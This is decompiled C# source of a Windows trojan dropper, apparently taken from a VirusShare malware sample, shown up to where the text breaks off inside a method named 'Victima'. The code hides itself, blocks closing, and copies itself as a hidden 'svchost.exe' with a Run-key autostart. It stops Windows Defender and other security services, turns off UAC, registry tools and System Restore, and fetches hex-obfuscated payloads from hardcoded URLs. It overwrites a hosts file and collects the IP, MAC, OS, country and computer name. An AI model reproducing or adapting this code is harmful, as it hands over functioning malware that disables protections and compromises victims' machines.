// Decompiled with JetBrains decompiler
// Type: Postales.Form1
// Assembly: ReproducirPostales, Version=2.0.3.2, Culture=neutral, PublicKeyToken=null
// MVID: 7846D817-428D-470C-B8C4-68FF94CB7D69
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Dropper.Win32.Daws.boa-7bd4f7c9562bc362427b9d7a144cfc1d5334eac66fbfde2f2690d672897ffa99.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using Postales.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Windows.Forms;

namespace Postales
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser _WebBrowser1;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("ServiceController1")]
    private ServiceController _ServiceController1;
    private string ResultadoURL;
    private string Analisis1;
    private string Analisis2;
    private string Analisis3;
    private string URLBegin1;
    private string URLBegin2;
    private string URLBegin3;
    private string Dir;
    private string Cant;
    private string Directory;
    private string DondeStoy;
    private WebRequest Buscar;
    private HttpWebResponse Resultado;
    private string direccion_Ip;
    private string nombre_Host;
    private string Tiempo;
    private string Time;
    private long I;
    private long R;
    private string Mac;
    private string NombreUsu;
    private string PaisSO;
    private string WinSO;
    private string IPx;
    private UTF8Encoding ue;
    private RSACryptoServiceProvider sec;
    private byte[] bytString;
    private byte[] bytEncriptar;
    private byte[] bytDesEncriptar;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.Closing += new CancelEventHandler(this.Form1_Closing);
      Form1.__ENCAddToList((object) this);
      this.ue = new UTF8Encoding();
      this.sec = new RSACryptoServiceProvider();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Label3 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.WebBrowser1 = new WebBrowser();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Label4 = new Label();
      this.ServiceController1 = new ServiceController();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(77, 19);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(298, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 1;
      this.TextBox1.Visible = false;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(77, 45);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(298, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 3;
      this.TextBox2.Visible = false;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(77, 71);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(171, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 4;
      this.TextBox3.Visible = false;
      this.Label3.AutoSize = true;
      Label label3_1 = this.Label3;
      point1 = new Point(280, 230);
      Point point5 = point1;
      label3_1.Location = point5;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(50, 13);
      Size size5 = size1;
      label3_2.Size = size5;
      this.Label3.TabIndex = 5;
      this.Label3.Text = "Repetir 5";
      this.Label3.Visible = false;
      this.Timer1.Enabled = true;
      WebBrowser webBrowser1_1 = this.WebBrowser1;
      point1 = new Point(77, 114);
      Point point6 = point1;
      webBrowser1_1.Location = point6;
      WebBrowser webBrowser1_2 = this.WebBrowser1;
      size1 = new Size(20, 20);
      Size size6 = size1;
      webBrowser1_2.MinimumSize = size6;
      this.WebBrowser1.Name = "WebBrowser1";
      WebBrowser webBrowser1_3 = this.WebBrowser1;
      size1 = new Size(298, 90);
      Size size7 = size1;
      webBrowser1_3.Size = size7;
      this.WebBrowser1.TabIndex = 42;
      this.WebBrowser1.Visible = false;
      this.Timer2.Enabled = true;
      this.Label4.AutoSize = true;
      Label label4_1 = this.Label4;
      point1 = new Point(280, 243);
      Point point7 = point1;
      label4_1.Location = point7;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(50, 13);
      Size size8 = size1;
      label4_2.Size = size8;
      this.Label4.TabIndex = 43;
      this.Label4.Text = "Repetir 6";
      this.Label4.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ControlLightLight;
      size1 = new Size(394, 263);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.WebBrowser1);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.SizeGripStyle = SizeGripStyle.Hide;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (Form1);
      this.TransparencyKey = System.Drawing.Color.White;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual Label Label3
    {
      [DebuggerNonUserCode] get => this._Label3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual WebBrowser WebBrowser1
    {
      [DebuggerNonUserCode] get => this._WebBrowser1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser1 = value;
    }

    internal virtual Label Label4
    {
      [DebuggerNonUserCode] get => this._Label4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Timer);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Timer);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual ServiceController ServiceController1
    {
      [DebuggerNonUserCode] get => this._ServiceController1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ServiceController1 = value;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.URLBegin1 = "687474703A2F2F7777772E756E69746564746563686E6963696E646F6E657369612E636F6D2F456E71756972792F66696C65732F636F6E6669672E786D6C";
      this.URLBegin2 = "363837343734373033413246324637333635373237363639363336353735373736313645373432453633364636443246373936353643364336463737354636393644363136373635373332463633364636453636363936373245363936453639";
      this.URLBegin3 = "333633383337333433373334333733303333343133323436333234363336333133363435333633383336343633373332333733333336333533323435333634353336333533373334333234363335333333363332333734313332343633373333333733313336343333323435333733303336333833373330";
      this.TextBox2.Text = "343333413543353736393645363436463737373335433533373937333734363536443333333235433738373636393634363336463732373236353245363436433643";
      this.TextBox3.Text = "433A5C57696E646F77735C53797374656D33325C647269766572735C776C707877736D2E737973";
      this.Dir = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "33343333333334313335343333353337333633393336343533363334333634363337333733373333333534333335333333373339333733333337333433363335333634343333333333333332333534333336333433373332333633393337333633363335333733323337333333353433333633353337333433363333333534333336333833363436333733333337333433373333"))))));
      this.Directory = Conversions.ToString(MyProject.Computer.Registry.GetValue(Conversions.ToString(this.Desencriptar((object) "484B45595F43555252454E545F555345525C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C4578706C6F7265725C5368656C6C20466F6C64657273")), Conversions.ToString(this.Desencriptar((object) "4C6F63616C2041707044617461")), (object) null));
      this.RunStart();
      this.CoP();
      this.RegTar();
      this.FXR();
      this.SWS();
      this.GO();
    }

    public void Form1_Closing(object sender, CancelEventArgs e) => e.Cancel = true;

    private object SWS()
    {
label_1:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.ServiceController1.ServiceName = Conversions.ToString(this.Desencriptar((object) "57696E446566656E64"));
label_3:
        num3 = 3;
        this.ServiceController1.Stop();
label_4:
        num3 = 4;
        this.ServiceController1.ServiceName = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "37373735363137353733363537323736"))));
label_5:
        num3 = 5;
        this.ServiceController1.Stop();
label_6:
        num3 = 6;
        this.ServiceController1.ServiceName = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "353334343532353335363433"))));
label_7:
        num3 = 7;
        this.ServiceController1.Stop();
label_8:
        num3 = 8;
        obj1 = (object) true;
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private string RunStart()
    {
      string str1 = Conversions.ToString(this.Desencriptar((object) "534F4654574152455C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"));
      string str2 = "";
      MyProject.Computer.Registry.LocalMachine.DeleteSubKeyTree(str1);
      try
      {
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey(str1, RegistryKeyPermissionCheck.ReadWriteSubTree);
        subKey.OpenSubKey(str1, true);
        subKey.SetValue(Conversions.ToString(this.Desencriptar((object) "57696E646F777320446566656E646572")), Operators.AddObject((object) this.Directory, this.Desencriptar((object) "5C57696E646F777320446566656E6465725C416E616C697A65725C737663686F73742E657865")));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = ex.Message.ToString();
        ProjectData.ClearProjectError();
      }
      return str2;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void CoP()
    {
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar((object) "5C57696E646F777320446566656E6465725C416E616C697A65725C737663686F73742E657865")))))
      {
        FileSystem.SetAttr(Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "354335373639364536343646373737333230343436353636363536453634363537323543343136453631364336393741363537323543"))))), FileAttribute.System);
        FileSystem.SetAttr(Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar((object) "5C57696E646F777320446566656E6465725C416E616C697A65725C737663686F73742E657865"))), FileAttribute.Hidden);
      }
      else
      {
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath.ToString(), Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar((object) "5C57696E646F777320446566656E6465725C416E616C697A65725C737663686F73742E657865"))), true);
        FileSystem.SetAttr(Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "354335373639364536343646373737333230343436353636363536453634363537323543343136453631364336393741363537323543"))))), FileAttribute.System);
        FileSystem.SetAttr(Conversions.ToString(Operators.AddObject((object) this.Directory, this.Desencriptar((object) "5C57696E646F777320446566656E6465725C416E616C697A65725C737663686F73742E657865"))), FileAttribute.Hidden);
      }
    }

    private string RegTar()
    {
      string keyName = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "333433383334343233343335333533393335343633343333333533353335333233353332333433353334343533353334333534363335333533353333333433353335333233353433333533333336343633363336333733343337333733363331333733323336333533353433333434343336333933363333333733323336343633373333333634363336333633373334333534333335333733363339333634353336333433363436333733373337333333353433333433333337333533373332333733323336333533363435333733343335333633363335333733323337333333363339333634363336343533353433333533303336343633363433333633393336333333363339333633353337333333353433333533333337333933373333333733343336333533363434"))))));
      MyProject.Computer.Registry.SetValue(keyName, Conversions.ToString(this.Desencriptar((object) "44697361626C655265676973747279546F6F6C73")), (object) "1", RegistryValueKind.DWord);
      return keyName;
    }

    private string FXR()
    {
      string keyName1 = Conversions.ToString(this.Desencriptar((object) "484B45595F4C6F63616C5F4D616368696E655C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C506F6C69636965735C53797374656D"));
      string keyName2 = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "34383442343535393546344336463633363136433546344436313633363836393645363535433533364636363734373736313732363535433530364636433639363336393635373335433444363936333732364637333646363637343543353736393645363436463737373332303445353435433533373937333734363536443532363537333734364637323635"))));
      string keyName3 = Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "3334333833343432333433353335333933353436333434333334343633343333333433313334343333353436333434343334333133343333333433383334333933343435333433353335343333353333333434363334333633353334333533373334333133353332333433353335343333343434333633393336333333373332333634363337333333363436333633363337333433353433333533333336333533363333333733353337333233363339333733343337333933323330333433333336333533363435333733343336333533373332"))))));
      try
      {
        MyProject.Computer.Registry.SetValue(keyName2, Conversions.ToString(this.Desencriptar((object) "44697361626C65436F6E666967")), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName2, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "343436393733363136323643363535333532")))), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar((object) "416E74695370795761726544697361626C654E6F74696679")), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "3431364537343639353636393732373537333434363937333631363236433635344536463734363936363739")))), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar((object) "4175746F55706461746544697361626C654E6F74696679")), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "333433363336333933373332333633353337333733363331333634333336343333343334333633393337333333363331333633323336343333363335333434353336343633373334333633393336333633373339")))))), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar((object) "496E7465726E657453657474696E677344697361626C654E6F74696679")), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName3, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "3535363136333434363937333631363236433635344536463734363936363739")))), (object) "1", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar((object) "436F6E73656E7450726F6D70744265686176696F7241646D696E")), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar((object) "456E61626C65496E7374616C6C6572446574656374696F6E")), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "333433353336343533363331333633323336343333363335333434333335333533343331")))))), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar((object) "456E61626C655365637572655549415061746873")), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar((object) "46696C74657241646D696E6973747261746F72546F6B656E")), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar((object) "56616C696461746541646D696E436F64655369676E617475726573")), (object) "0", RegistryValueKind.DWord);
        MyProject.Computer.Registry.SetValue(keyName1, Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "3435364536313632364336353535343934313434363537333642373436463730353436463637363736433635")))), (object) "0", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return keyName1;
    }

    public void GO()
    {
      if (this.Conexion())
      {
        this.ServHost(Conversions.ToString(this.Desencriptar((object) this.URLBegin1)), Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) this.URLBegin2)))), Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) this.URLBegin3)))))), Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) this.TextBox2.Text)))));
        this.IP();
        this.VerMac();
        this.VerSO();
        this.Pais();
        this.NameSO();
        this.Victima();
      }
      else
        this.Nadita();
    }

    public bool Nadita() => false;

    public bool Conexion()
    {
      try
      {
        return MyProject.Computer.Network.IsAvailable;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public string Verificar(string URL)
    {
      try
      {
        this.Buscar = WebRequest.Create(URL);
        this.Resultado = (HttpWebResponse) this.Buscar.GetResponse();
        this.ResultadoURL = this.Resultado.StatusDescription;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
      return this.ResultadoURL;
    }

    public bool DownloadFile(string URLA, string Dir)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        WebClient webClient = new WebClient();
label_3:
        num3 = 3;
        webClient.DownloadFile(URLA, Dir);
label_4:
        num3 = 4;
        webClient.Dispose();
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      bool flag;
      int num5 = flag ? 1 : 0;
      if (num2 == 0)
        return num5 != 0;
      ProjectData.ClearProjectError();
      return num5 != 0;
    }

    public void ServHost(string Bajar1, string Bajar2, string Bajar3, string Guardar)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (Operators.CompareString(this.Verificar(Bajar1), "OK", false) != 0)
          goto label_6;
label_3:
        num3 = 3;
        this.DownloadFile(Bajar1, Guardar);
label_4:
        num3 = 4;
        this.LeerVar(Guardar);
label_5:
        num3 = 5;
        this.Analisis1 = this.Cant;
        goto label_14;
label_6:
        num3 = 7;
        if (Operators.CompareString(this.Verificar(Bajar2), "OK", false) != 0)
          goto label_10;
label_7:
        num3 = 8;
        this.DownloadFile(Bajar2, Guardar);
label_8:
        num3 = 9;
        this.LeerVar(Guardar);
label_9:
        num3 = 10;
        this.Analisis2 = this.Cant;
        goto label_14;
label_10:
        num3 = 12;
        if (Operators.CompareString(this.Verificar(Bajar3), "OK", false) != 0)
          goto label_14;
label_11:
        num3 = 13;
        this.DownloadFile(Bajar3, Guardar);
label_12:
        num3 = 14;
        this.LeerVar(Guardar);
label_13:
        num3 = 15;
        this.Analisis3 = this.Cant;
label_14:
label_15:
        num3 = 17;
        if (Operators.CompareString(this.Analisis1, "", false) == 0)
          goto label_17;
label_16:
        num3 = 18;
        this.ServTXT(Conversions.ToString(this.Desencriptar((object) this.Analisis1)), Conversions.ToString(this.Desencriptar((object) this.TextBox3.Text)));
        goto label_23;
label_17:
        num3 = 20;
        if (Operators.CompareString(this.Analisis2, "", false) == 0)
          goto label_19;
label_18:
        num3 = 21;
        this.ServTXT(Conversions.ToString(this.Desencriptar((object) this.Analisis2)), Conversions.ToString(this.Desencriptar((object) this.TextBox3.Text)));
        goto label_23;
label_19:
        num3 = 23;
        if (Operators.CompareString(this.Analisis3, "", false) == 0)
          goto label_21;
label_20:
        num3 = 24;
        this.ServTXT(Conversions.ToString(this.Desencriptar((object) this.Analisis3)), Conversions.ToString(this.Desencriptar((object) this.TextBox3.Text)));
        goto label_23;
label_21:
        num3 = 26;
label_22:
        num3 = 27;
        this.Nadita();
label_23:
        goto label_30;
label_25:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
              case 11:
              case 16:
                goto label_14;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
              case 22:
              case 25:
              case 28:
                goto label_23;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 23:
                goto label_19;
              case 24:
                goto label_20;
              case 26:
                goto label_21;
              case 27:
                goto label_22;
              case 29:
                goto label_30;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_25;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_30:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void ServTXT(string ptm, string jhos)
    {
      if (Operators.CompareString(this.Verificar(ptm), "OK", false) == 0)
      {
        this.DownloadFile(ptm, jhos);
        this.LeerVar(jhos);
        this.VerCan();
      }
      else
        this.Nadita();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public object LeerVar(string Var)
    {
      try
      {
        string str = Var;
        this.Cant = "";
        FileSystemProxy fileSystem = MyProject.Computer.FileSystem;
        if (fileSystem.FileExists(str))
        {
          this.Cant = fileSystem.ReadAllText(str).ToString();
          FileSystem.Kill(str);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) this.Cant;
    }

    public void VerCan()
    {
      if (Operators.CompareString(this.Cant, "", false) != 0)
        this.Hosts();
      else
        this.Nadita();
    }

    public void Hosts()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        StreamWriter streamWriter = new StreamWriter(this.Dir);
label_3:
        num3 = 3;
        string cant = this.Cant;
label_4:
        num3 = 4;
        streamWriter.Write(cant);
label_5:
        num3 = 5;
        streamWriter.Flush();
        goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public string IP()
    {
      this.nombre_Host = Dns.GetHostName();
      this.direccion_Ip = Dns.GetHostByName(this.nombre_Host).AddressList[0].ToString();
      this.IPx = this.direccion_Ip;
      return this.IPx;
    }

    public string VerSO()
    {
      this.WinSO = Conversions.ToString(MyProject.Computer.Registry.GetValue(Conversions.ToString(this.Desencriptar((object) "484B45595F4C6F63616C5F4D616368696E655C536F6674776172655C4D6963726F736F66745C57696E646F7773204E545C43757272656E7456657273696F6E5C")), "ProductName", (object) null));
      return this.WinSO;
    }

    public string NameSO()
    {
      this.NombreUsu = MyProject.Computer.Name;
      return this.NombreUsu;
    }

    public string Pais()
    {
      this.PaisSO = Conversions.ToString(MyProject.Computer.Registry.GetValue(Conversions.ToString(this.Desencriptar(RuntimeHelpers.GetObjectValue(this.Desencriptar((object) "3438344234353539354634333735373237323635364537343546353537333635373235433433364636453734373236463643323035303631364536353643354334393645373436353732364536313734363936463645363136433543")))), "sCountry", (object) null));
      return this.PaisSO;
    }

    public string VerMac()
    {
      try
      {
        this.Mac = "";
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + "." + "\\root\\cimv2")), (System.Type) null, "ExecQuery", new object[1]
        {
          (object) "Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
        try
        {
          foreach (object obj in (IEnumerable) objectValue)
            this.Mac = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "MACAddress", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        return this.Mac;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return Conversions.ToString(true);
    }

    public string Victima()
    {
